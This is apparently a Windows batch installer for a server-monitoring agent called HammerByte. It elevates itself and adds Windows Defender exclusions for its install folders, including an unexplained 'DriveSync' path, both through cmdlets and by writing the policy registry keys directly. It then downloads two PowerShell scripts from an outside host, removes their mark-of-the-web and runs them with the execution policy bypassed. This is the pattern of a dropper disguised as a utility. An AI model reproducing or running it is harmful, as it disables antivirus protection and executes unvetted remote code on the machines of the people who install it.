@echo off
setlocal EnableExtensions
REM HammerByte Server Monitor installer - Windows Server 2012+
REM Double-click or Run as administrator.

cd /d "%~dp0"

net session >nul 2>&1
if errorlevel 1 (
  echo Requesting Administrator...
  powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
  exit /b 0
)

set "HB_ROOT=%ProgramData%\HammerByte"
set "INSTALL_DIR=%HB_ROOT%\ServerMonitor"
if not exist "%HB_ROOT%" mkdir "%HB_ROOT%"
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
if not exist "%INSTALL_DIR%" (
  echo Failed to create %INSTALL_DIR%
  pause
  exit /b 1
)

echo.
echo HammerByte Server Monitor installer
echo Install dir: %INSTALL_DIR%
echo.
echo Adding Windows Defender exclusions for %HB_ROOT% ...
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { $root=$env:ProgramData+'\HammerByte'; $paths=@($root, (Join-Path $root 'ServerMonitor'), (Join-Path $root 'DriveSync')); foreach($p in $paths){ if(-not (Test-Path $p)){ New-Item -ItemType Directory -Path $p -Force | Out-Null } }; try { Import-Module Defender -ErrorAction SilentlyContinue | Out-Null } catch {}; if(Get-Command Add-MpPreference -EA SilentlyContinue){ foreach($p in $paths){ try { Add-MpPreference -ExclusionPath $p -EA Stop } catch {} } }; foreach($reg in @('HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths','HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths')){ try { if(-not (Test-Path $reg)){ New-Item -Path $reg -Force | Out-Null }; foreach($p in $paths){ New-ItemProperty -Path $reg -Name (($p.TrimEnd('\'))+'\') -Value 0 -PropertyType DWord -Force -EA Stop | Out-Null } } catch {} }; Write-Host 'Defender allowlist applied' } catch { Write-Host ('allowlist warn: '+$_.Exception.Message) }"

REM Prefer local scripts if present next to this .cmd (offline / USB copy).
if exist "%~dp0supervisor.ps1" if exist "%~dp0agent.ps1" (
  echo Copying local scripts...
  copy /Y "%~dp0supervisor.ps1" "%INSTALL_DIR%\supervisor.ps1" >nul
  copy /Y "%~dp0agent.ps1" "%INSTALL_DIR%\agent.ps1" >nul
) else (
  echo Downloading scripts from hammerbyte.co.in ...
  powershell -NoProfile -ExecutionPolicy Bypass -Command "try { $ErrorActionPreference='Stop'; try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { [Net.ServicePointManager]::SecurityProtocol = [Enum]::ToObject([Net.SecurityProtocolType], 3072) }; $d=$env:INSTALL_DIR; if (-not $d) { $d='%INSTALL_DIR%' }; $w=New-Object System.Net.WebClient; $w.DownloadFile('https://hammerbyte.co.in/public/server-monitors/supervisor.ps1', (Join-Path $d 'supervisor.ps1')); $w.DownloadFile('https://hammerbyte.co.in/public/server-monitors/agent.ps1', (Join-Path $d 'agent.ps1')); Write-Host 'Download OK' } catch { Write-Host ('DOWNLOAD ERROR: ' + $_.Exception.Message); exit 1 }"
  if errorlevel 1 (
    echo.
    echo Download failed. Check internet / TLS 1.2 on this server.
    echo Or copy supervisor.ps1 and agent.ps1 into the same folder as this installer and run again.
    pause
    exit /b 1
  )
)

if not exist "%INSTALL_DIR%\supervisor.ps1" (
  echo supervisor.ps1 missing in %INSTALL_DIR%
  pause
  exit /b 1
)
if not exist "%INSTALL_DIR%\agent.ps1" (
  echo agent.ps1 missing in %INSTALL_DIR%
  pause
  exit /b 1
)

powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -LiteralPath '%INSTALL_DIR%' -Filter *.ps1 -EA SilentlyContinue | ForEach-Object { try { Unblock-File -LiteralPath $_.FullName -EA SilentlyContinue } catch {}; try { $ads=$_.FullName+':Zone.Identifier'; if(Test-Path -LiteralPath $ads){ Remove-Item -LiteralPath $ads -Force -EA SilentlyContinue } } catch {} }"

echo.
echo Starting supervisor...
powershell -NoProfile -ExecutionPolicy Bypass -File "%INSTALL_DIR%\supervisor.ps1" -Install
set "ERR=%ERRORLEVEL%"
echo.
echo Supervisor exited with code %ERR%
pause
exit /b %ERR%
